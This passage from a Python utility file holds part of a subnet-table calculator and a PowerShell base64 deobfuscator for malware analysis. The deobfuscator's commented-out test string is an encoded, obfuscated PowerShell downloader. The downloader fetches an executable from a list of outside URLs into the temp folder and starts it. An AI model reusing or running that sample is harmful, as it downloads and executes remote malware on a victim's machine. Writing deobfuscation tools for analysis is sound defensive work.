						if i == subnet_network_row:
							matchArr.append(result_changing_octets_for_ip)
						changing_octets_for_ip[2] = str(use2Arr[i])
						changing_octets_for_ip[3] = str(254)
						result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
						#print(result_changing_octets_for_ip, end='  \t| ')
						response += result_changing_octets_for_ip+'  \t| '
						if i == subnet_network_row:
							matchArr.append(result_changing_octets_for_ip)
						changing_octets_for_ip[2] = str(broadArr[i])
						changing_octets_for_ip[3] = str(255)
						result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
						#print('  ', result_changing_octets_for_ip)
						response += '  '+result_changing_octets_for_ip+'\n'
						if i == subnet_network_row:
							matchArr.append(result_changing_octets_for_ip)
			if octets_for_subnet_mask[1] == '254' or int(octets_for_subnet_mask[3]) > 254:
				#print('\nCannot Subnet with given CIDR/Subnet Mask\n\nReturning to Start...')
				ipInput()
			if octets_for_subnet_mask[1] == '252':
				#return_subnet_table.print_net_use_broad()
				response += '\n#  | \t Network \t| \t\tUsable \t\t\t| \t Broadcast\n-----------------------------------------------------------------------------------------\n'
				for i in range(0,256,4):
					netArr.append(i)
					use1Arr.append(i)
					use2Arr.append(i+3)
					broadArr.append(i+3)
					row_count += 1
					if (((int(octets_for_entered_ip[1])) - i >= 0)  and ((int(octets_for_entered_ip[1])) - (i+3) <= 0)):
						subnet_network_row = row_count
				for i in range(len(netArr)):
					changing_octets_for_ip[1] = str(netArr[i])
					changing_octets_for_ip[2] = str(0)
					changing_octets_for_ip[3] = str(0)
					result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
					#print(i, ' | ', result_changing_octets_for_ip, end=' \t| ')
					response += str(i)+' | '+result_changing_octets_for_ip+' \t| '
					if i == subnet_network_row:
						matchArr.append(result_changing_octets_for_ip)
					changing_octets_for_ip[1] = str(use1Arr[i])
					changing_octets_for_ip[2] = str(0)
					changing_octets_for_ip[3] = str(1)
					result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
					#print(' ', result_changing_octets_for_ip, end=' - ')
					response += ' '+result_changing_octets_for_ip+' - '
					if i == subnet_network_row:
						matchArr.append(result_changing_octets_for_ip)
					changing_octets_for_ip[1] = str(use2Arr[i])
					changing_octets_for_ip[2] = str(255)
					changing_octets_for_ip[3] = str(254)
					result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
					#print(result_changing_octets_for_ip, end='  \t| ')
					response += result_changing_octets_for_ip+'  \t| '
					if i == subnet_network_row:
						matchArr.append(result_changing_octets_for_ip)
					changing_octets_for_ip[1] = str(broadArr[i])
					changing_octets_for_ip[2] = str(255)
					changing_octets_for_ip[3] = str(255)
					result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
					#print('  ', result_changing_octets_for_ip)
					response += '  '+result_changing_octets_for_ip+'\n'
					if i == subnet_network_row:
						matchArr.append(result_changing_octets_for_ip)
			if octets_for_subnet_mask[1] == '248':
				#return_subnet_table.print_net_use_broad()
				response += '\n#  | \t Network \t| \t\tUsable \t\t\t| \t Broadcast\n-----------------------------------------------------------------------------------------\n'
				for i in range(0,256,8):
					netArr.append(i)
					use1Arr.append(i)
					use2Arr.append(i+7)
					broadArr.append(i+7)
					row_count += 1
					if (((int(octets_for_entered_ip[1]))- i >= 0)  and ((int(octets_for_entered_ip[1])) - (i+7) <= 0)):
						subnet_network_row = row_count
				for i in range(len(netArr)):
					changing_octets_for_ip[1] = str(netArr[i])
					changing_octets_for_ip[2] = str(0)
					changing_octets_for_ip[3] = str(0)
					result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
					#print(i, ' | ', result_changing_octets_for_ip, end=' \t| ')
					response += str(i)+' | '+result_changing_octets_for_ip+' \t| '
					if i == subnet_network_row:
						matchArr.append(result_changing_octets_for_ip)
					changing_octets_for_ip[1] = str(use1Arr[i])
					changing_octets_for_ip[2] = str(0)
					changing_octets_for_ip[3] = str(1)
					result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
					#print(' ', result_changing_octets_for_ip, end=' - ')
					response += ' '+result_changing_octets_for_ip+' - '
					if i == subnet_network_row:
						matchArr.append(result_changing_octets_for_ip)
					changing_octets_for_ip[1] = str(use2Arr[i])
					changing_octets_for_ip[2] = str(255)
					changing_octets_for_ip[3] = str(254)
					result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
					#print(result_changing_octets_for_ip, end='  \t| ')
					response += result_changing_octets_for_ip+'  \t| '
					if i == subnet_network_row:
						matchArr.append(result_changing_octets_for_ip)
					changing_octets_for_ip[1] = str(broadArr[i])
					changing_octets_for_ip[2] = str(255)
					changing_octets_for_ip[3] = str(255)
					result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
					#print('  ', result_changing_octets_for_ip)
					response += '  '+result_changing_octets_for_ip+'\n'
					if i == subnet_network_row:
						matchArr.append(result_changing_octets_for_ip)
			if octets_for_subnet_mask[1] == '240':
				#return_subnet_table.print_net_use_broad()
				response += '\n#  | \t Network \t| \t\tUsable \t\t\t| \t Broadcast\n-----------------------------------------------------------------------------------------\n'
				for i in range(0,256,16):
					netArr.append(i)
					use1Arr.append(i)
					use2Arr.append(i+15)
					broadArr.append(i+15)
					row_count += 1
					if (((int(octets_for_entered_ip[1])) - i >= 0)  and ((int(octets_for_entered_ip[1])) - (i+15) <= 0)):
						subnet_network_row = row_count
				for i in range(len(netArr)):
					changing_octets_for_ip[1] = str(netArr[i])
					changing_octets_for_ip[2] = str(0)
					changing_octets_for_ip[3] = str(0)
					result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
					#print(i, ' | ', result_changing_octets_for_ip, end=' \t| ')
					response += str(i)+' | '+result_changing_octets_for_ip+' \t| '
					if i == subnet_network_row:
						matchArr.append(result_changing_octets_for_ip)
					changing_octets_for_ip[1] = str(use1Arr[i])
					changing_octets_for_ip[2] = str(0)
					changing_octets_for_ip[3] = str(1)
					result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
					#print(' ', result_changing_octets_for_ip, end=' - ')
					response += ' '+result_changing_octets_for_ip+' - '
					if i == subnet_network_row:
						matchArr.append(result_changing_octets_for_ip)
					changing_octets_for_ip[1] = str(use2Arr[i])
					changing_octets_for_ip[2] = str(255)
					changing_octets_for_ip[3] = str(254)
					result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
					#print(result_changing_octets_for_ip, end='  \t| ')
					response += result_changing_octets_for_ip+'  \t| '
					if i == subnet_network_row:
						matchArr.append(result_changing_octets_for_ip)
					changing_octets_for_ip[1] = str(broadArr[i])
					changing_octets_for_ip[2] = str(255)
					changing_octets_for_ip[3] = str(255)
					result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
					#print('  ', result_changing_octets_for_ip)
					response += '  '+result_changing_octets_for_ip+'\n'
					if i == subnet_network_row:
						matchArr.append(result_changing_octets_for_ip)
			if octets_for_subnet_mask[1] == '224':
				#return_subnet_table.print_net_use_broad()
				response += '\n#  | \t Network \t| \t\tUsable \t\t\t| \t Broadcast\n-----------------------------------------------------------------------------------------\n'
				for i in range(0,256,32):
					netArr.append(i)
					use1Arr.append(i)
					use2Arr.append(i+31)
					broadArr.append(i+31)
					row_count += 1
					if (((int(octets_for_entered_ip[1])) - i >= 0)  and ((int(octets_for_entered_ip[1])) - (i+31) <= 0)):
						subnet_network_row = row_count
				for i in range(len(netArr)):
					changing_octets_for_ip[1] = str(netArr[i])
					changing_octets_for_ip[2] = str(0)
					changing_octets_for_ip[3] = str(0)
					result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
					#print(i, ' | ', result_changing_octets_for_ip, end=' \t| ')
					response += str(i)+' | '+result_changing_octets_for_ip+' \t| '
					if i == subnet_network_row:
						matchArr.append(result_changing_octets_for_ip)
					changing_octets_for_ip[1] = str(use1Arr[i])
					changing_octets_for_ip[2] = str(0)
					changing_octets_for_ip[3] = str(1)
					result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
					#print(' ', result_changing_octets_for_ip, end=' - ')
					response += ' '+result_changing_octets_for_ip+' - '
					if i == subnet_network_row:
						matchArr.append(result_changing_octets_for_ip)
					changing_octets_for_ip[1] = str(use2Arr[i])
					changing_octets_for_ip[2] = str(255)
					changing_octets_for_ip[3] = str(254)
					result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
					#print(result_changing_octets_for_ip, end='  \t| ')
					response += result_changing_octets_for_ip+'  \t| '
					if i == subnet_network_row:
						matchArr.append(result_changing_octets_for_ip)
					changing_octets_for_ip[1] = str(broadArr[i])
					changing_octets_for_ip[2] = str(255)
					changing_octets_for_ip[3] = str(255)
					result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
					#print('  ', result_changing_octets_for_ip)
					response += '  '+result_changing_octets_for_ip+'\n'
					if i == subnet_network_row:
						matchArr.append(result_changing_octets_for_ip)
			if octets_for_subnet_mask[1] == '192':
				#return_subnet_table.print_net_use_broad()
				response += '\n#  | \t Network \t| \t\tUsable \t\t\t| \t Broadcast\n-----------------------------------------------------------------------------------------\n'
				for i in range(0,256,64):
					netArr.append(i)
					use1Arr.append(i)
					use2Arr.append(i+63)
					broadArr.append(i+63)
					row_count += 1
					if (((int(octets_for_entered_ip[1])) - i >= 0)  and ((int(octets_for_entered_ip[1])) - (i+63) <= 0)):
						subnet_network_row = row_count
				for i in range(len(netArr)):
					changing_octets_for_ip[1] = str(netArr[i])
					changing_octets_for_ip[2] = str(0)
					changing_octets_for_ip[3] = str(0)
					result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
					#print(i, ' | ', result_changing_octets_for_ip, end=' \t| ')
					response += str(i)+' | '+result_changing_octets_for_ip+' \t| '
					if i == subnet_network_row:
						matchArr.append(result_changing_octets_for_ip)
					changing_octets_for_ip[1] = str(use1Arr[i])
					changing_octets_for_ip[2] = str(0)
					changing_octets_for_ip[3] = str(1)
					result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
					#print(' ', result_changing_octets_for_ip, end=' - ')
					response += ' '+result_changing_octets_for_ip+' - '
					if i == subnet_network_row:
						matchArr.append(result_changing_octets_for_ip)
					changing_octets_for_ip[1] = str(use2Arr[i])
					changing_octets_for_ip[2] = str(255)
					changing_octets_for_ip[3] = str(254)
					result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
					#print(result_changing_octets_for_ip, end='  \t| ')
					response += result_changing_octets_for_ip+'  \t| '
					if i == subnet_network_row:
						matchArr.append(result_changing_octets_for_ip)
					changing_octets_for_ip[1] = str(broadArr[i])
					changing_octets_for_ip[2] = str(255)
					changing_octets_for_ip[3] = str(255)
					result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
					#print('  ', result_changing_octets_for_ip)
					response += '  '+result_changing_octets_for_ip+'\n'
					if i == subnet_network_row:
						matchArr.append(result_changing_octets_for_ip)
			if octets_for_subnet_mask[1] == '128':
				#return_subnet_table.print_net_use_broad()
				response += '\n#  | \t Network \t| \t\tUsable \t\t\t| \t Broadcast\n-----------------------------------------------------------------------------------------\n'
				for i in range(0,256,128):
					netArr.append(i)
					use1Arr.append(i)
					use2Arr.append(i+127)
					broadArr.append(i+127)
					row_count += 1
					if (((int(octets_for_entered_ip[1])) - i >= 0)  and ((int(octets_for_entered_ip[1])) - (i+127) <= 0)):
						subnet_network_row = row_count
				for i in range(len(netArr)):
					changing_octets_for_ip[1] = str(netArr[i])
					changing_octets_for_ip[2] = str(0)
					changing_octets_for_ip[3] = str(0)
					result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
					#print(i, ' | ', result_changing_octets_for_ip, end=' \t| ')
					response += str(i)+' | '+result_changing_octets_for_ip+' \t| '
					if i == subnet_network_row:
						matchArr.append(result_changing_octets_for_ip)
					changing_octets_for_ip[1] = str(use1Arr[i])
					changing_octets_for_ip[2] = str(0)
					changing_octets_for_ip[3] = str(1)
					result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
					#print(' ', result_changing_octets_for_ip, end=' - ')
					response += ' '+result_changing_octets_for_ip+' - '
					if i == subnet_network_row:
						matchArr.append(result_changing_octets_for_ip)
					changing_octets_for_ip[1] = str(use2Arr[i])
					changing_octets_for_ip[2] = str(255)
					changing_octets_for_ip[3] = str(254)
					result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
					#print(result_changing_octets_for_ip, end='  \t| ')
					response += result_changing_octets_for_ip+'  \t| '
					if i == subnet_network_row:
						matchArr.append(result_changing_octets_for_ip)
					changing_octets_for_ip[1] = str(broadArr[i])
					changing_octets_for_ip[2] = str(255)
					changing_octets_for_ip[3] = str(255)
					result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
					#print('  ', result_changing_octets_for_ip)
					response += '  '+result_changing_octets_for_ip+'\n'
					if i == subnet_network_row:
						matchArr.append(result_changing_octets_for_ip)
			if octets_for_subnet_mask[1] == '0':
				#return_subnet_table.print_net_use_broad()
				response += '\n#  | \t Network \t| \t\tUsable \t\t\t| \t Broadcast\n-----------------------------------------------------------------------------------------\n'
				for i in range(0,256,256):
					netArr.append(i)
					use1Arr.append(i)
					use2Arr.append(i+255)
					broadArr.append(i+255)
					row_count += 1
					if (((int(octets_for_entered_ip[1])) - i >= 0)  and ((int(octets_for_entered_ip[1])) - (i+255) <= 0)):
						subnet_network_row = row_count
				for i in range(len(netArr)):
					changing_octets_for_ip[1] = str(netArr[i])
					changing_octets_for_ip[2] = str(0)
					changing_octets_for_ip[3] = str(0)
					result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
					#print(i, ' | ', result_changing_octets_for_ip, end=' \t| ')
					response += str(i)+' | '+result_changing_octets_for_ip+' \t| '
					if i == subnet_network_row:
						matchArr.append(result_changing_octets_for_ip)
					changing_octets_for_ip[1] = str(use1Arr[i])
					changing_octets_for_ip[2] = str(0)
					changing_octets_for_ip[3] = str(1)
					result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
					#print(' ', result_changing_octets_for_ip, end=' - ')
					response += ' '+result_changing_octets_for_ip+' - '
					if i == subnet_network_row:
						matchArr.append(result_changing_octets_for_ip)
					changing_octets_for_ip[1] = str(use2Arr[i])
					changing_octets_for_ip[2] = str(255)
					changing_octets_for_ip[3] = str(254)
					result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
					#print(result_changing_octets_for_ip, end='  \t| ')
					response += result_changing_octets_for_ip+'  \t| '
					if i == subnet_network_row:
						matchArr.append(result_changing_octets_for_ip)
					changing_octets_for_ip[1] = str(broadArr[i])
					changing_octets_for_ip[2] = str(255)
					changing_octets_for_ip[3] = str(255)
					result_changing_octets_for_ip = '.'.join(changing_octets_for_ip)
					#print('  ', result_changing_octets_for_ip)
					response += '  '+result_changing_octets_for_ip+'\n'
					if i == subnet_network_row:
						matchArr.append(result_changing_octets_for_ip)
		try:
			#print('\n\n\n\nThe IP address you entered: "%s"    with the subnet mask of: "%s"    falls into subnet number: "%i"       which has  %s  usable addresses        and is comprised of the following ip address space:' % (entered_ip_address, entered_cidr_or_mask, subnet_network_row, usable_addresses))
			response += '\n\n\n\n\nThe IP address you entered: "%s"    with the subnet mask of: "%s"    falls into subnet number: "%s"       which has  %s  usable addresses        and is comprised of the following ip address space:' % (entered_ip_address, entered_cidr_or_mask, str(subnet_network_row), usable_addresses)
			#return_subnet_table.print_net_use_broad()
			response += '\n#  | \t Network \t| \t\tUsable \t\t\t| \t Broadcast\n-----------------------------------------------------------------------------------------\n'
			#print(subnet_network_row, end=' | ')
			response += str(subnet_network_row)+' | '
			#print(' ', matchArr[0], end=' \t| ')
			response += ' '+matchArr[0]+' \t| '
			#print(' ', matchArr[1], end=' - ')
			response += ' '+matchArr[1]+' - '
			#print(matchArr[2], end='  \t| ')
			response += matchArr[2]+'  \t| '
			#print('  ', matchArr[3], '\n')
			response += '  '+matchArr[3]+'\n'
		except:
			#print('N\\A')
			response += '\n\n\nN\\A'
			
		return response
		
		
def deobfuscate_powershell_base64(test_string):
	response = ''
	import re
	global single_long_bit_array_string, second_iter_binary_array, deobfuscated_character_array, deobfuscated_string, ps1_strings_array_init, ps1_strings_array_total, test_ps1_substitute_array_format, response
	first_iter_binary_array = []
	single_long_bit_array_string = ''
	second_iter_binary_array = []
	deobfuscated_character_array = []
	ps1_strings_array_total = []
	deobfuscated_string = ''
	ascii_num_array = [32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126]
	ascii_alphabet_array = [' ', '!', '"', '#', '$', '%', '&', '\'', '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~']
	binary_ascii_alphabet_numbers = ['00100000', '00100001', '00100010', '00100011', '00100100', '00100101', '00100110', '00100111', '00101000', '00101001', '00101010', '00101011', '00101100', '00101101', '00101110', '00101111', '00110000', '00110001', '00110010', '00110011', '00110100', '00110101', '00110110', '00110111', '00111000', '00111001', '00111010', '00111011', '00111100', '00111101', '00111110', '00111111', '01000000', '01000001', '01000010', '01000011', '01000100', '01000101', '01000110', '01000111', '01001000', '01001001', '01001010', '01001011', '01001100', '01001101', '01001110', '01001111', '01010000', '01010001', '01010010', '01010011', '01010100', '01010101', '01010110', '01010111', '01011000', '01011001', '01011010', '01011011', '01011100', '01011101', '01011110', '01011111', '01100000', '01100001', '01100010', '01100011', '01100100', '01100101', '01100110', '01100111', '01101000', '01101001', '01101010', '01101011', '01101100', '01101101', '01101110', '01101111', '01110000', '01110001', '01110010', '01110011', '01110100', '01110101', '01110110', '01110111', '01111000', '01111001', '01111010', '01111011', '01111100', '01111101', '01111110']
	base64_aplabet_array = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '+', '/', '=']
	base64_aplabet_numbers = ['000000', '000001', '000010', '000011', '000100', '000101', '000110', '000111', '001000', '001001', '001010', '001011', '001100', '001101', '001110', '001111', '010000', '010001', '010010', '010011', '010100', '010101', '010110', '010111', '011000', '011001', '011010', '011011', '011100', '011101', '011110', '011111', '100000', '100001', '100010', '100011', '100100', '100101', '100110', '100111', '101000', '101001', '101010', '101011', '101100', '101101', '101110', '101111', '110000', '110001', '110010', '110011', '110100', '110101', '110110', '110111', '111000', '111001', '111010', '111011', '111100', '111101', '111110', '111111']
	#test_string = 'JAB7AFcAYABTAGMAUgBgAGkAcAB0AH0AIAA9ACAALgAoACIAewAyAH0AewAwAH0AewAxAH0AIgAtAGYAJwBlAHcALQBvAGIAagAnACwAJwBlAGMAdAAnACwAJwBuACcAKQAgAC0AQwBvAG0ATwBiAGoAZQBjAHQAIAAoACIAewAxAH0AewAwAH0AewAyAH0AIgAgAC0AZgAnAGwAJwAsACcAVwBTAGMAcgBpAHAAdAAuAFMAaABlACcALAAnAGwAJwApADsAJAB7AHcAZQBiAGMAYABsAGkARQBgAE4AVAB9ACAAPQAgACYAKAAiAHsAMwB9AHsAMQB9AHsAMAB9AHsAMgB9ACIALQBmACcAagBlAGMAJwAsACcAdwAtAG8AYgAnACwAJwB0ACcALAAnAG4AZQAnACkAIAAoACIAewAwAH0AewAyAH0AewAxAH0AewAzAH0AIgAgAC0AZgAgACcAUwAnACwAJwBlAHQALgBXACcALAAnAHkAcwB0AGUAbQAuAE4AJwAsACcAZQBiAEMAbABpAGUAbgB0ACcAKQA7ACQAewByAGAAQQBgAE4AZABvAE0AfQAgAD0AIAAuACgAIgB7ADAAfQB7ADEAfQB7ADIAfQAiACAALQBmACcAbgBlACcALAAnAHcALQBvACcALAAnAGIAagBlAGMAdAAnACkAIAAoACIAewAxAH0AewAwAH0AIgAgAC0AZgAnAG0AJwAsACcAcgBhAG4AZABvACcAKQA7ACQAewB1AGAAUgBsAHMAfQAgAD0AIAAoACIAewAyADMAfQB7ADIAMgB9AHsAMgA0AH0AewA4AH0AewAxAH0AewAxADkAfQB7ADIAMQB9AHsAMwB9AHsANAB9AHsAOQB9AHsAMgB9AHsAMQAzAH0AewAxADUAfQB7ADEAMgB9AHsANgB9AHsAMQAxAH0AewAxADAAfQB7ADcAfQB7ADEANwB9AHsAMQA0AH0AewAxADYAfQB7ADUAfQB7ADEAOAB9AHsAMgAwAH0AewAwAH0AIgAgAC0AZgAgACcAZAAuAG4AbwAvAGsAdwBrAGMAYwBtAC8AJwAsACcAdABwADoALwAvACcALAAnAEcALwAnACwAJwBlAGwALgBkAGUAJwAsACcALwBDAGoAUABEACcALAAnAG8AbQAvAG8AJwAsACcAYwBuAGUAcgBkAC4AJwAsACcAZABpAGcAaQAnACwAJwB0ACcALAAnAFIAWQBTACcALAAnAGQAWgAvACwAaAB0AHQAcAA6AC8ALwAnACwAJwBjAG8AbQAvAEQAZwBKACcALAAnAHUAcwBpACcALAAnACwAJwAsACcAYQByAHQAcwB0AGEAdABpAG8AbgAnACwAJwBoAHQAdABwADoALwAvAHQAaABlAG0AJwAsACcALgBjACcALAAnAHQAYQBsACcALAAnAG8AaQBOAHkALwAsAGgAdAB0AHAAOgAvAC8AJwAsACcAcgAnACwAJwBhAHMAbwB1AG4AJwAsACcAYQBuAG8AawAnACwAJwB2AGkAYQBsAC4AYwAnACwAJwBoAHQAdABwADoALwAvAHQAaABpAGIAYQB1AHQAJwAsACcAbwBtAC8AeABVAFkAWgBKAHoAeABvAC8ALABoACcAKQAuACgAIgB7ADEAfQB7ADAAfQAiAC0AZgAnAHQAJwAsACcAUwBwAGwAaQAnACkALgBJAG4AdgBvAGsAZQAoACcALAAnACkAOwAkAHsAbgBgAEEAbQBlAH0AIAA9ACAAJAB7AFIAYQBOAGQAYABPAE0AfQAuACgAIgB7ADEAfQB7ADAAfQAiACAALQBmACcAZQB4AHQAJwAsACcAbgAnACkALgBJAG4AdgBvAGsAZQAoADEALAAgADYANQA1ADMANgApADsAJAB7AFAAYABBAHQASAB9ACAAPQAgACQAewBFAE4AVgA6AHQAYABFAGAATQBwAH0AIAArACAAJwBcACcAIAArACAAJAB7AE4AQQBgAG0ARQB9ACAAKwAgACgAIgB7ADAAfQB7ADEAfQAiACAALQBmACAAJwAuAGUAeAAnACwAJwBlACcAKQA7AGYAbwByAGUAYQBjAGgAKAAkAHsAdQBgAFIATAB9ACAAaQBuACAAJAB7AFUAUgBgAEwAcwB9ACkAewB0AHIAeQB7ACQAewB3AEUAYABCAGMAbABpAGUAYABOAHQAfQAuACgAIgB7ADAAfQB7ADIAfQB7ADEAfQAiACAALQBmACAAJwBEAG8AdwAnACwAJwBhAGQARgBpAGwAZQAnACwAJwBuAGwAbwAnACkALgBJAG4AdgBvAGsAZQAoACQAewBVAGAAUgBsAH0ALgAoACIAewAxAH0AewAwAH0AewAyAH0AIgAtAGYAIAAnAHQAcgBpAG4AJwAsACcAVABvAFMAJwAsACcAZwAnACkALgBJAG4AdgBvAGsAZQAoACkALAAgACQAewBQAGAAQQB0AGgAfQApADsAJgAoACIAewAwAH0AewAxAH0AewAyAH0AIgAtAGYAIAAnAFMAdABhACcALAAnAHIAdAAtAFAAcgBvAGMAJwAsACcAZQBzAHMAJwApACAAJAB7AFAAYABBAFQAaAB9ADsAYgByAGUAYQBrADsAfQBjAGEAdABjAGgAewAuACgAIgB7ADIAfQB7ADMAfQB7ADAAfQB7ADEAfQAiAC0AZgAgACcALQAnACwAJwBoAG8AcwB0ACcALAAnAHcAcgAnACwAJwBpAHQAZQAnACkAIAAkAHsAXwB9AC4AIgBFAHgAYABjAGUAcABgAFQASQBPAG4AIgAuACIATQBgAEUAYABTAFMAQQBHAEUAIgA7AH0AfQANAAoA'
	for i in range(len(test_string)):
		for ii in range(len(base64_aplabet_array)):
			if test_string[i] == base64_aplabet_array[ii] and test_string[i] != '=':
				first_iter_binary_array.append(base64_aplabet_numbers[ii])
		if i == len(test_string)-1 and test_string[i] == '=':
			first_iter_binary_array.append('000000')
	single_long_bit_array_string = ''.join(first_iter_binary_array)
	for i in range(0,len(single_long_bit_array_string),8):
		second_iter_binary_array.append(single_long_bit_array_string[i:i+8])
	for i in range(len(second_iter_binary_array)):
		for ii in range(len(binary_ascii_alphabet_numbers)):
			if second_iter_binary_array[i] == binary_ascii_alphabet_numbers[ii]:
				deobfuscated_character_array.append(ascii_alphabet_array[ii])
	deobfuscated_string = (''.join(deobfuscated_character_array)).replace('`', '')
	#print(deobfuscated_string)
	#print()
	test_ps1_substitute_array_format = re.findall('\([\S\s]*?-f[\S\s]*?\)', deobfuscated_string)
	for i in range(len(test_ps1_substitute_array_format)):
		ps1_strings_array_init = []
		ps1_array_nums = re.findall('{([0-9]+?)}', test_ps1_substitute_array_format[i])
		strings_array = re.findall('-f([\s\S]*?)\)', test_ps1_substitute_array_format[i])
		ps1_strings_array = re.findall('\'([\S\s]*?)\'', strings_array[0])
		if len(ps1_array_nums) == len(ps1_strings_array):
			for ii in range(len(ps1_array_nums)):
				#print(ps1_strings_array[int(ps1_array_nums[ii])], end='')
				ps1_strings_array_init.append(ps1_strings_array[int(ps1_array_nums[ii])])
			ps1_strings_array_total.append(''.join(ps1_strings_array_init))
			#print(end=' ')
	proper_deobfuscated_string = ''
	for i in range(len(test_ps1_substitute_array_format)):
		if i == 0:
			proper_deobfuscated_string = deobfuscated_string.replace(test_ps1_substitute_array_format[i], ps1_strings_array_total[i])
		if i > 0:
			proper_deobfuscated_string = proper_deobfuscated_string.replace(test_ps1_substitute_array_format[i], ps1_strings_array_total[i])
	if proper_deobfuscated_string == '':
		proper_deobfuscated_string = '***First Deobfuscator could not fully decode PowerShell info**\n\n'
	print('\n\n\n-----------------------------------------------------\n\n'+proper_deobfuscated_string+'\n\n\n\nOriginal Decoded String Before Full Deob:\n\n'+deobfuscated_string+'\n\n')
	
	
	response += '\n\n\n-----------------------------------------------------\n\n'+proper_deobfuscated_string+'\n\n\n\nOriginal Decoded String Before Full Deob:\n\n'+deobfuscated_string+'\n\n'
	
	#powershell_deobfuscate_file = open('PowerShell_Deobfuscation_File\\Deobfuscated_PowerShell_File.txt', 'w')
	#powershell_deobfuscate_file.write('\n\n\n-----------------------------------------------------\n\n\n')
	#powershell_deobfuscate_file.write(proper_deobfuscated_string)
	#powershell_deobfuscate_file.write('\n\n')
	#powershell_deobfuscate_file.write('\n\nOriginal Decoded String Before Full Deob:\n\n')
	#powershell_deobfuscate_file.write(deobfuscated_string)
	#powershell_deobfuscate_file.write('\n\n')
	
	
	
	first_iter_binary_array = []
	single_long_bit_array_string = ''
	second_iter_binary_array = []
	deobfuscated_character_array = []
	ps1_strings_array_total = []
	deobfuscated_string = ''
	siphoned_ascii_deobfuscated_array = []
	siphoned_ascii_deobfuscated_string = ''
	ascii_num_array = [32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126]
	ascii_alphabet_array = [' ', '!', '"', '#', '$', '%', '&', '\'', '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~']
